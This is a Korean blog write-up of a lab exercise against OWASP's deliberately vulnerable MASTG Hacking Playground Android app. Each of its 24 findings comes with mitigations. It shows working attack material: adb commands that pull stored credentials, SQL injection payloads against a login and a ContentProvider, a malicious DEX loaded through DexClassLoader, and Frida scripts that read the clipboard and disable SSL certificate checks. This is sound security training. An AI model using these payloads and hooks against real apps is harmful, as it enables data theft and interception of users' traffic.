---
title: "OWASP MASTG Hacking Playground: Android 취약점 24종 실습"
date: 2026-09-28 15:30:00 +0900
categories: [Security, Android]
tags: [owasp, mastg, android, adb, jadx, frida, sql-injection, webview, dexclassloader, ssl-pinning, mitmproxy, writeup, mission57]
---

## 1. 들어가며

이번 미션은 OWASP의 교육용 취약 앱인 [MASTG Hacking Playground](https://github.com/OWASP/MASTG-Hacking-Playground)의 Android Java 앱을 대상으로 했다. 단순히 GitHub 소스를 읽는 데서 끝내지 않고, 저장소에 포함된 배포 파일 `app-x86-debug-Android5.apk`를 API 26과 API 23 에뮬레이터에 설치해 메뉴를 직접 발화했다.

![MASTG Hacking Playground 메인 화면](/assets/img/mastg-hacking-playground-24/01-main.png)
_API 26 x86 에뮬레이터에서 실행한 배포 APK. 화면의 항목을 위에서부터 하나씩 실행했다._

소스와 APK가 다를 수 있으므로 분석 기준은 다음 순서로 고정했다.

```text
배포 APK SHA-256
D1559B2B81C82179B93B5BE4D3D16B70C302523CC2338CBC62D9E0CD1A2035BF

APK → JADX 디컴파일 → AndroidManifest/DEX/native .so 대조
    → API 26 동적 발화 → API 23 레거시 동작 재검증
```

## 2. 실습 환경

| 항목 | 값 |
|---|---|
| Host | Windows 11, Android Emulator 37.1.11 |
| 주 환경 | Android 8.0 / API 26 / Google APIs x86 |
| 레거시 환경 | Android 6.0 / API 23 / Google APIs x86 |
| APK | `app-x86-debug-Android5.apk`, version 1.0 |
| package | `sg.vp.owasp_mobile.omtg_android` |
| APK 설정 | minSdk 21, targetSdk 23, debuggable |
| 정적 분석 | JADX 1.5.3, aapt, strings |
| 동적 분석 | adb root/run-as, sqlite3, logcat, Frida 17.18.0 |
| 네트워크 | mitmproxy 12, `adb reverse` |

```bash
adb install -r app-x86-debug-Android5.apk
adb shell getprop ro.build.version.sdk
# 26

adb shell run-as sg.vp.owasp_mobile.omtg_android id
# uid=10084(u0_a84) ...
```

## 3. 24개 결과 요약

앱 메뉴는 22개다. 이 글에서는 `Secure Channel`의 HTTP/HTTPS를 각각 한 건으로, 원격 WebView의 bridge secret과 `getClass` RCE 여부를 각각 한 건으로 나눠 미션 요구사항의 24개 결과로 정리했다.

| # | 테스트 | 실측 결과 |
|---:|---|---|
| 1 | Bad Encryption | XOR 후 비트 반전 알고리즘을 역산해 `SuperSecret` 회수 |
| 2 | KeyChain | `server.p12`, import password `1234`가 APK에 함께 존재 |
| 3 | KeyStore | AndroidKeyStore RSA 키 생성·암복호화 확인, 공개키/암호문이 logcat에 출력 |
| 4 | Internal Storage | `files/test_file`에서 카드번호 평문 추출 |
| 5 | External Storage | `/sdcard/password.txt`에서 `L33tS3cr3t` 추출 |
| 6 | SharedPreferences | `key.xml`에서 `administrator / supersecret` 추출 |
| 7 | SQLite Plaintext | `privateNotSoSecure`에서 `admin / AdminPass` 추출 |
| 8 | SQLCipher | 네이티브 키 `S3cr3tString!!!` 회수. 배포 APK는 의존 `.so` 누락으로 API 26에서 크래시 |
| 9 | Logging | 입력한 `mission57 / LogPass57`이 logcat에 그대로 노출 |
| 10 | Third-party Crash Reporting | ACRA endpoint와 크래시 보고 데이터가 앱 밖으로 전송되는 구조 확인 |
| 11 | Keyboard Cache | 민감 필드의 suggestion 학습 가능 여부와 inputType 설정 대조 |
| 12 | Clipboard | selection 차단 구현을 확인하고 Frida로 전역 clipboard 읽기 성공 |
| 13 | Memory | AES 복호화 평문이 Java String으로 heap에 남는 구조 확인 |
| 14 | WebView Remote Bridge | `Android.returnString()`이 `Secret String` 반환 |
| 15 | WebView `getClass` RCE | target/API 17+ annotation gate 때문에 `getClass()`는 노출되지 않아 해당 체인은 차단 |
| 16 | WebView Local | file URL + 원격 JS + file access 조합, 내부 파일 탈취 가능 구조 확인 |
| 17 | SQL Best Practice | selectionArgs 바인딩으로 동일 SQLi 페이로드 차단 |
| 18 | Local SQL Injection | `admin' OR 1=1 -- `로 로그인 우회 |
| 19 | ContentProvider SQLi | root `content query`의 selection 주입으로 전체 학생 행 추출 |
| 20 | DexClassLoader | `/sdcard/libcodeinjection.jar`의 자작 DEX 실행, 로그 문자열 확인 |
| 21 | Plain HTTP | mitmproxy에서 `GET http://example.com/`과 200 응답 평문 캡처 |
| 22 | HTTPS | 인증서 미신뢰 상태에서는 프록시 TLS handshake 실패 |
| 23 | Custom SSL Pinning | Frida로 `checkServerTrusted()`를 no-op 처리해 검증 우회 |
| 24 | Whole-certificate Pinning | APK 내 `certificate.pem` 고정 신뢰. 인증서 교체·만료와 우회 위험 확인 |

## 4. Insecure Data Storage

### 4.1 내부 저장소, SharedPreferences, SQLite

Internal Storage 화면을 열자 앱은 카드번호를 `MODE_PRIVATE` 파일에 저장했다.

![내부 저장소 테스트 화면](/assets/img/mastg-hacking-playground-24/02-internal-storage.png)

```bash
adb shell run-as sg.vp.owasp_mobile.omtg_android cat files/test_file
# Credit Card Number is 1234 4321 5678 8765

adb shell run-as sg.vp.owasp_mobile.omtg_android cat shared_prefs/key.xml
```

```xml
<map>
    <string name="password">supersecret</string>
    <string name="username">administrator</string>
</map>
```

SQLite도 암호화되지 않았다.

```bash
adb root
adb shell sqlite3 \
  /data/data/sg.vp.owasp_mobile.omtg_android/databases/privateNotSoSecure \
  "select Username,Password from Accounts;"
# admin|AdminPass
```

`MODE_PRIVATE`은 다른 일반 UID의 직접 접근을 제한할 뿐 파일 내용을 암호화하지 않는다. 이 APK처럼 debuggable이거나 단말 root/백업/동일 프로세스 코드 실행이 가능하면 평문은 그대로 회수된다.

### 4.2 외부 저장소

API 26에서는 READ/WRITE runtime permission을 허용한 뒤 테스트 화면을 다시 열었다.

![외부 저장소에 비밀번호를 쓰는 화면](/assets/img/mastg-hacking-playground-24/04-external-storage.png)

```bash
adb shell cat /sdcard/password.txt
# L33tS3cr3t
```

외부 저장소는 앱 샌드박스의 기밀 저장소가 아니다. 당시 플랫폼에서는 저장소 권한을 가진 다른 앱과 adb가 같은 파일을 읽을 수 있었다.

### 4.3 API 23의 `MODE_WORLD_READABLE`

같은 SharedPreferences 코드를 API 23에서 실행하자 파일 권한이 실제로 `0644`가 됐다.

![API 23에서 SharedPreferences를 생성한 화면](/assets/img/mastg-hacking-playground-24/12-api23-world-readable.png)

```bash
adb shell ls -l /data/data/sg.vp.owasp_mobile.omtg_android/shared_prefs/key.xml
# -rw-rw-r-- u0_a61 u0_a61 ... key.xml

adb shell cat /data/data/sg.vp.owasp_mobile.omtg_android/shared_prefs/key.xml
# administrator / supersecret
```

API 24 이상에서는 `MODE_WORLD_READABLE`이 `SecurityException` 대상이지만, targetSdk만 올리지 않은 오래된 기기에서는 실제 world-readable 파일이 생성된다. 그래서 API 23을 별도로 준비한 의미가 있었다.

## 5. 암호화와 키 관리

### 5.1 자작 암호 역산

암호문은 `vJqfip28ioydips=`다. Base64 decode 후 각 바이트에 XOR 16과 bitwise NOT을 적용하는 것이 전부였다.

```python
plain[i] = ~(cipher[i] ^ 0x10) & 0xff
# SuperSecret
```

![자작 암호를 풀어 정답을 입력한 화면](/assets/img/mastg-hacking-playground-24/13-bad-encryption-solved.png)

암호 알고리즘을 숨기는 것은 키 관리가 아니다. 표준 AEAD(AES-GCM 또는 ChaCha20-Poly1305)와 안전한 키 수명주기를 사용해야 한다.

### 5.2 SQLCipher의 하드코딩 키

JADX에서 `stringFromJNI()`가 DB open key로 전달되는 것을 확인한 뒤 APK의 x86 native library를 추출했다.

```bash
unzip app-x86-debug-Android5.apk lib/x86/libnative.so
strings lib/x86/libnative.so | grep S3cr3t
# S3cr3tString!!!
```

이 키를 아는 공격자는 DB 파일을 얻은 뒤 SQLCipher에서 그대로 열 수 있다. 암호화 DB와 키를 같은 클라이언트에 고정해 넣으면 획득 난이도만 조금 올라간다.

한 가지 배포물 이슈도 있었다. 테스트 화면을 API 26에서 열면 아래 예외로 앱이 종료됐다.

```text
java.lang.UnsatisfiedLinkError: couldn't find "libstlport_shared.so"
  at net.sqlcipher.database.SQLiteDatabase.loadLibs
```

![SQLCipher 테스트 발화 후 홈으로 종료된 화면](/assets/img/mastg-hacking-playground-24/03-encrypted-sqlite.png)
_저장소의 배포 APK에는 `libnative.so`만 있고 SQLCipher 의존 native library가 빠져 있었다. 키 회수는 가능했지만 이 배포물로 DB 생성까지 성공했다고 쓰지는 않았다._

## 6. 로그, 메모리, KeyStore와 클립보드

로그인 화면에 `mission57 / LogPass57`을 입력했다.

![로그인 자격증명을 넣은 Logging 화면](/assets/img/mastg-hacking-playground-24/05-logging.png)

```text
E OMTG_DATAST_002_Logging:
  User successfully logged in. User: mission57 Password: LogPass57
```

KeyStore 예제는 private key export가 아니라 RSA 연산 자체는 AndroidKeyStore에 맡긴다. 하지만 코드가 public key와 ciphertext를 logcat에 쓰며, Memory 예제는 복호화된 값을 immutable Java `String`으로 만든다. 키를 export하지 못하더라도 평문을 쓰는 시점과 로그가 새로운 유출 지점이 된다.

Clipboard 항목은 long-click action mode를 막으려 하지만 전역 clipboard 자체가 보안 저장소가 되는 것은 아니다. API 26 앱 프로세스에 Frida를 붙여 clipboard service를 호출했다.

```javascript
const app = Java.use('android.app.ActivityThread').currentApplication();
const context = app.getApplicationContext();
const ClipboardManager = Java.use('android.content.ClipboardManager');
const clipboard = Java.cast(
  context.getSystemService('clipboard'), ClipboardManager
);
console.log(clipboard.getPrimaryClip().getItemAt(0).coerceToText(context));
```

```text
[+] Global clipboard: GLOBAL_CLIPBOARD_SECRET_57
```

최신 Android는 background clipboard read를 제한하지만, 구버전 앱·foreground 코드·악성 키보드·접근성 서비스까지 포함하면 민감값을 clipboard에 두지 않는 것이 안전하다.

## 7. SQL Injection

### 7.1 로컬 SQLite 인증 우회

취약한 쿼리는 문자열을 직접 이어 붙인다.

```java
authentication.rawQuery(
  "SELECT * FROM Accounts WHERE Username = '" + username +
  "' and Password = '" + password + "';", null);
```

사용자 이름에 `admin' OR 1=1 -- `를 넣자 비밀번호 `x`와 무관하게 로그인됐다.

![로컬 SQL Injection으로 로그인한 화면](/assets/img/mastg-hacking-playground-24/06-sqli.png)
_하단 Toast의 `User logged in`으로 우회를 확인했다._

반면 Best Practice 화면은 다음처럼 placeholder를 사용하므로 같은 입력이 데이터로 처리됐다.

```java
rawQuery(
  "SELECT * FROM Accounts WHERE Username=? and Password=?",
  new String[] { username, password }
);
```

### 7.2 ContentProvider SQLi

provider를 먼저 실행하고 root shell에서 학생을 넣었다. 이 provider는 외부 공개가 기본 차단되어 일반 shell UID 요청은 `SecurityException`이었고, 미션 조건대로 root에서 실증했다.

```bash
content insert --uri content://sg.vp.owasp_mobile.provider.College/students \
  --bind name:s:Alice --bind grade:s:A
content insert --uri content://sg.vp.owasp_mobile.provider.College/students \
  --bind name:s:Bob --bind grade:s:B

content query --uri content://sg.vp.owasp_mobile.provider.College/students \
  --where 'name=char(66,111,98))OR 1=1--'
```

```text
Row: 0 _id=1, name=Alice, grade=A
Row: 1 _id=2, name=Bob, grade=B
```

![ContentProvider 테스트 화면](/assets/img/mastg-hacking-playground-24/07-content-provider.png)

provider의 `selection`도 결국 SQL이다. exported 여부와 별개로 selectionArgs 바인딩, caller permission, URI별 최소 권한이 필요하다.

## 8. 외부 DEX 임의 코드 실행

다음 클래스를 Java 8 bytecode로 빌드하고 D8로 `classes.dex`를 만든 뒤 JAR로 묶었다.

```java
package com.example;

public class CodeInjection {
    public String returnString() {
        return "MISSION57_DEX_EXECUTED";
    }
}
```

```bash
d8 --output dex CodeInjection.class
jar cf libcodeinjection.jar classes.dex
adb push libcodeinjection.jar /sdcard/libcodeinjection.jar
```

앱은 외부 저장소의 경로를 무결성 검증 없이 `DexClassLoader`에 전달했다.

```text
E Test: MISSION57_DEX_EXECUTED
```

![외부 DEX Code Injection 테스트 화면](/assets/img/mastg-hacking-playground-24/08-dex-code-injection.png)

공격자가 교체할 수 있는 저장소에서 실행 코드를 읽어 오면 앱 UID 권한으로 임의 코드가 실행된다. 동적 모듈이 꼭 필요하다면 앱 내부 저장소, 서명 검증, 강한 버전·해시 정책을 함께 적용해야 한다.

## 9. WebView

### 9.1 원격 bridge secret

원격 WebView는 JavaScript를 켠 뒤 객체를 `Android`라는 이름으로 노출한다.

```java
myWebView.getSettings().setJavaScriptEnabled(true);
myWebView.addJavascriptInterface(jsInterface, "Android");
myWebView.loadUrl("https://rawgit.com/sushi2k/AndroidWebView/master/webview.htm");
```

`@JavascriptInterface returnString()`은 `Secret String`을 반환한다. 원격 문서가 변조되면 이 메서드는 공격자 JavaScript가 호출한다.

오래된 Android의 유명한 체인인 `Android.getClass().forName(...Runtime...)`도 확인했다. 이 APK는 minSdk 21이고 API 17부터 annotation이 붙은 메서드만 노출하므로 `getClass()`는 JavaScript에 공개되지 않았다. 즉 bridge secret은 노출되지만 이 특정 reflection RCE 체인은 API 23/26에서 차단됐다.

### 9.2 로컬 WebView의 file access

로컬 항목은 더 위험한 조합이다.

```java
setJavaScriptEnabled(true);
setAllowFileAccessFromFileURLs(true);
loadUrl("file:///android_asset/local.htm");
```

로컬 HTML은 원격 JavaScript를 불러오고, 스크립트는 `file:///data/data/.../shared_prefs/key.xml`을 XHR로 읽으려 한다. 신뢰 경계가 다른 원격 JS, 로컬 file origin, 앱 내부 파일을 한 WebView에 연결하면 저장된 credential까지 이어진다.

## 10. HTTP 프록시와 SSL Pinning

### 10.1 평문 HTTP 캡처

호스트 mitmproxy를 에뮬레이터에 reverse하고 전역 프록시를 지정했다.

```bash
mitmdump --listen-host 127.0.0.1 --listen-port 8081
adb reverse tcp:8080 tcp:8081
adb shell settings put global http_proxy 127.0.0.1:8080
```

Secure Channel 화면을 여는 즉시 평문 요청이 보였다.

```text
GET http://example.com/
Host: example.com
X-Requested-With: sg.vp.owasp_mobile.omtg_android
<< 200 OK
```

![HTTP와 HTTPS WebView를 함께 로드한 화면](/assets/img/mastg-hacking-playground-24/11-http-proxy.png)

HTTP body까지 그대로 보였고 변경도 가능하다. HTTPS 쪽은 프록시 CA를 신뢰하지 않아 handshake가 실패했는데, 이것은 pinning이 아니라 기본 CA trust 단계에서의 실패다.

### 10.2 Frida SSL 검증 우회

Custom SSL Pinning은 `HardenedX509TrustManager.checkServerTrusted()`에서 issuer를 고정 비교한다. 앱을 Frida로 spawn해 Activity보다 먼저 구현을 바꿨다.

```javascript
Java.perform(function () {
  const TM = Java.use(
    'sg.vp.owasp_mobile.OMTG_Android.HardenedX509TrustManager'
  );
  TM.checkServerTrusted.implementation = function (chain, authType) {
    console.log('[+] checkServerTrusted bypassed: ' + authType);
    return;
  };
});
```

```text
Spawned `sg.vp.owasp_mobile.omtg_android`. Resuming main thread!
[+] HardenedX509TrustManager hook installed
[+] checkServerTrusted bypassed: ECDHE_ECDSA
```

![SSL Pinning 테스트 화면](/assets/img/mastg-hacking-playground-24/10-frida-ssl-bypass.png)

Whole-certificate 항목은 APK의 `res/raw/certificate.pem`만 신뢰하는 별도 방식이다. 앱에 포함된 Java trust code는 런타임 후킹 가능하고, 고정 인증서는 만료·교체 때 앱 업데이트가 필요하다. pinning은 보조 방어이지 클라이언트에 중요한 비밀과 권한 결정을 맡길 근거가 아니다.

## 11. 그 밖의 항목

- **KeyChain**: `server.p12`와 password `1234`가 함께 배포된다. 예제의 import 흐름 자체보다 “클라이언트 번들에 비밀을 숨길 수 없다”는 점이 핵심이다.
- **Keyboard Cache**: 민감한 입력은 password inputType, suggestion/autofill 정책을 명시해야 한다. 키보드는 별도 프로세스이므로 앱 sandbox만으로 학습 데이터를 통제할 수 없다.
- **Third-party**: 앱은 ACRA endpoint를 manifest/application 코드에 고정하고 의도적 crash report를 전송한다. crash report에도 자격증명, URL, stack, device 정보가 들어갈 수 있으므로 수집 범위와 보존 정책을 검토해야 한다.
- **Memory**: 강한 AES를 사용해도 복호화된 `String`은 heap dump와 instrumentation에서 보인다. 민감 데이터의 평문 생존 시간을 줄이고 필요 시 byte array를 덮어써야 한다.

## 12. 결론

이번 실습에서 가장 인상 깊었던 것은 “암호화를 썼는가”보다 **데이터와 코드가 어느 신뢰 경계를 넘는가**가 더 중요하다는 점이었다.

1. 내부 저장소의 `MODE_PRIVATE`은 암호화가 아니다.
2. SQLCipher도 키가 APK 안에 있으면 root/정적 분석 공격자에게 무력화된다.
3. SQL 문자열 연결은 서버뿐 아니라 로컬 DB와 ContentProvider에서도 인증 우회가 된다.
4. 외부 저장소에서 DEX를 읽으면 데이터 변조가 곧 코드 실행이 된다.
5. WebView bridge, file origin, 원격 JavaScript를 함께 쓰면 개별 옵션보다 조합이 더 위험하다.
6. TLS pinning은 Frida 같은 런타임 계측을 막는 절대 경계가 아니다.
7. 구형 플랫폼 동작을 확인하려면 targetSdk 설명만 보지 말고 실제 API 버전에서 실행해야 한다.

또한 실패도 결과였다. 배포 APK의 SQLCipher native dependency가 빠져 있다는 사실, API 26에서 `MODE_WORLD_READABLE`이 재현되지 않는다는 사실, API 17+에서 `getClass` bridge RCE가 막힌다는 사실을 구분해 기록해야 실제 분석과 과장된 체크리스트 사이의 차이가 생긴다.

## 13. 참고 자료

- [OWASP MASTG Hacking Playground](https://github.com/OWASP/MASTG-Hacking-Playground)
- [Hacking Playground Android App Wiki](https://github.com/OWASP/MASTG-Hacking-Playground/wiki/Android-App)
- [OWASP Mobile Application Security](https://mas.owasp.org/MASTG/)
- [Android Data and File Storage](https://developer.android.com/training/data-storage)
- [Android WebView security](https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges)
- [Frida Android documentation](https://frida.re/docs/android/)
- [mitmproxy documentation](https://docs.mitmproxy.org/)
